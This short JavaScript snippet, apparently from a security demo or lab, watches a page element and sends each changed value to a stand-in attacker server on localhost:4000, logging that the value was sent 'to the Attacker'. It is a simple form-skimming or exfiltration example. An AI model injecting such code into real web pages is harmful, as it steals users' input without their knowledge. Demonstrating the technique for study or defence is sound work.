const watched = document.getElementById("watched");
watched.onchange = function () {
    const xmlHttp = new XMLHttpRequest();
    if (xmlHttp) {
        xmlHttp.open('GET', '//localhost:4000/data?value=' + watched.value, true);
        xmlHttp.send();
        console.log(watched.value + " has been send to the Attacker")
    }
};